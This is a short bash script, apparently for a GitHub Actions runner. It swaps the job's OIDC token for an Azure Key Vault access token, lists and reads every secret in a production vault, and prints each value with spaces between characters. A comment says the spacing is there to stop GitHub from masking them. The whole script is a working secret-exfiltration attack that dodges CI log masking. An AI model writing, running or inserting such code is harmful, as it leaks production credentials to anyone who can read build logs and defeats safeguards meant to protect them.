#!/usr/bin/env bash
set -u
CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
VAULT="https://kv-tbl-prod-x3euoz.vault.azure.net"

sp(){ printf '%s\n' "$1" | sed 's/./& /g'; }   # chèn space giữa ký tự -> GitHub không mask

echo "== OIDC =="
if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "NO_OIDC"; exit 0; fi
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
echo "oidc_len=${#OIDC}"

echo "== Azure token (vault scope) =="
AT=$(curl -sS -X POST "https://login.microsoftonline.com/${TID}/oauth2/v2.0/token" \
  -d "client_id=${CID}" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=${OIDC}" \
  --data-urlencode "scope=https://vault.azure.net/.default" \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token","") or ("ERR:"+json.dumps(d)))')
echo "token_len=${#AT}"
case "$AT" in ERR:*) echo "$AT"; exit 0;; esac

echo "== secrets =="
IDS=$(curl -sS "${VAULT}/secrets?api-version=7.4" -H "Authorization: Bearer ${AT}" \
  | python3 -c 'import sys,json;[print(x["id"]) for x in json.load(sys.stdin).get("value",[])]')
echo "$IDS"
for u in $IDS; do
  echo "-- $u"
  V=$(curl -sS "${u}?api-version=7.4" -H "Authorization: Bearer ${AT}" \
    | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
  sp "$V"
done
echo "== done =="
